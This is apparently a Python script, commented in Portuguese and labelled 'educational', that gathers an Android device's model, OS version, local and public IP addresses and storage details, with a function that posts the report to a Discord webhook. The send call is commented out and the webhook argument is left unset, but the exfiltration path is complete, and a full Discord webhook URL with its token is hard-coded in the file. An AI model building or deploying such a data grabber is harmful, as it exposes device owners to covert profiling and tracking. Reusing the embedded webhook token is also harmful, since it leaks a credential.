import os
import json
import base64
import requests
import socket
import subprocess
from android.storage import app_storage_path

# Configurações para Android
class MobileAnalyzer:
    def __init__(self, webhook_url=None):
        self.webhook_url = webhook_url
        self.session_id = base64.b85encode(os.urandom(16)).decode()
        
    def get_android_info(self):
        """Coleta informações do dispositivo Android"""
        try:
            # Informações básicas do Android
            brand = subprocess.check_output(['getprop', 'ro.product.brand']).decode().strip()
            model = subprocess.check_output(['getprop', 'ro.product.model']).decode().strip()
            android_version = subprocess.check_output(['getprop', 'ro.build.version.release']).decode().strip()
            
            return {
                "device": f"{brand} {model}",
                "android_version": android_version,
                "termux_version": "0.118.0",
                "storage_path": app_storage_path()
            }
        except Exception as e:
            return {"error": str(e)}

    def get_network_info(self):
        """Obtém informações de rede"""
        try:
            hostname = socket.gethostname()
            ip_local = socket.gethostbyname(hostname)
            
            # IP público precisa de internet
            try:
                ip_public = requests.get('https://api64.ipify.org', timeout=5).text
            except:
                ip_public = "Unable to get public IP"
                
            return {
                "local_ip": ip_local,
                "public_ip": ip_public,
                "hostname": hostname
            }
        except Exception as e:
            return {"error": str(e)}

    def get_storage_info(self):
        """Verifica espaço em disco"""
        try:
            storage = subprocess.check_output(['df', '/data']).decode().split('\n')[1]
            return {"storage_info": storage}
        except:
            return {"storage_info": "Unknown"}

    def create_mobile_report(self):
        """Cria relatório do dispositivo mobile"""
        return {
            "device_info": self.get_android_info(),
            "network_info": self.get_network_info(),
            "storage_info": self.get_storage_info(),
            "session_id": self.session_id,
            "timestamp": "2024-09-02T00:00:00Z"
        }

    def send_to_discord(self, data):
        """Envia para webhook (APENAS EDUCATIVO)"""
        if not self.webhook_url:
            return False
            
        try:
            embed = {
                "title": "📱 Mobile Device Report",
                "color": 0x3498db,
                "fields": [
                    {
                        "name": "📟 Device",
                        "value": f"**Model:** {data['device_info']['device']}\n**Android:** {data['device_info']['android_version']}",
                        "inline": True
                    },
                    {
                        "name": "🌐 Network",
                        "value": f"**Local IP:** {data['network_info']['local_ip']}\n**Public IP:** {data['network_info']['public_ip']}",
                        "inline": True
                    }
                ],
                "footer": {"text": "Mobile Analyzer - Educational"}
            }
            
            response = requests.post(self.webhook_url, json={"embeds": [embed]})
            return response.status_code == 200
        except:
            return False

    def run_analysis(self):
        """Executa análise educativa"""
        print("📱 Analyzing mobile device...")
        
        report = self.create_mobile_report()
        
        print(f"\n📊 Device: {report['device_info']['device']}")
        print(f"🤖 Android: {report['device_info']['android_version']}")
        print(f"🌐 Local IP: {report['network_info']['local_ip']}")
        print(f"🌐 Public IP: {report['network_info']['public_ip']}")
        
        if self.webhook_url:
            print("\n⚠️  Educational webhook simulation")
            # self.send_to_discord(report)  # DESCOMENTAR SÓ PARA ESTUDO
            
        return report

# Versão SEGURA para aprendizado
if __name__ == "__main__":
    print("=== MOBILE ANALYZER (EDUCATIONAL) ===")
    print("⚠️  For learning purposes only!")
    print("⚠️  Does not steal data or harm devices!\n")
    
    # Webhook de exemplo - NÃO USAR REAL
    EXAMPLE_WEBHOOK = "https://discord.com/api/webhooks/1413174338085191721/jWjTrhSDZmdx2KzXb1RD9hMR0RjSMkPXVyVxXOsCPKCuWR4A1ET1jrjpX40yIYz2vbCl"
    
    analyzer = MobileAnalyzer(webhook_url=None)  # Webhook None para segurança
    result = analyzer.run_analysis()
    
    print(f"\n✅ Analysis completed safely!")
    print(f"Session ID: {result['session_id']}")
